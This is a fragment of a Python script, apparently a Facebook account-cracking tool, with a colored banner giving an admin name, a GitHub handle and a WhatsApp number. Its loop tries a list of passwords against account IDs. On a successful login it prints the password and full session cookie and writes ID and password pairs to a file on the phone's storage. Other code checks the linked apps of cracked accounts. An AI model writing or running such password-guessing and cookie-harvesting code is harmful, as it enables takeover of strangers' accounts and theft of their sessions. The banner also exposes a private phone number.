...
\033[33;1m ╩ ╩\033[31;1m╩ ╩\033[34;1m╩ ╩\033[35;1m╩\033[32;1m╩ ╩ \x1b[1;96m╚═╝\x1b[38;5;208m═╩╝\033[31;1m═╩╝\033[1;97m╩\033[1;30m╝╚╝ \33[33;1m╚╝\33[35;1m╩\33[32;1m╚═╝\33[31;1m╩ ╩\33[34;1m╝╚╝
\033[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\033[38;5;46m┃ \x1b[38;5;196m√ADMIN\x1b[38;5;196m   :\x1b[1;96   HAMIM UDDIN JISAN         \033[38;5;46m┃
...
\033[38;5;46m┣━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┫
\033[38;5;46m┃ \033[33;1mGITHUB  \x1b[38;5;196m: \x1b[38;5;208mX1X4D-2-0      \033[38;5;46m┃\033[33;1m BD:RANDOM \033[38;5;46m┃
\033[38;5;46m┃ \x1b[1;96mWATHSAPP\x1b[38;5;196m: \033[1;97m+8801814649133 \033[38;5;46m┃\033[1;97m\033[1;45mVersion 1.2\033[1;0m\033[1;97m\033[38;5;46m┃
...
def cek_apk(session,coki):
	...
	if len(game)==0:
	    ...
	    #else:
		##print("")
		#####(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
...
def admin():
	...
	if bal =='1':
		###os.system('xdg-open https://wa.me/+8801814649133);time.sleep(1)
		admin()
	if bal =='2':
		###os.system('xdg-open https://www.facebook.com/TurRealabbu1');time.sleep(1)
		admin()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mCHARCING-⏰\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [HAMIM-OK🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[☢️]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/HAMIM-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
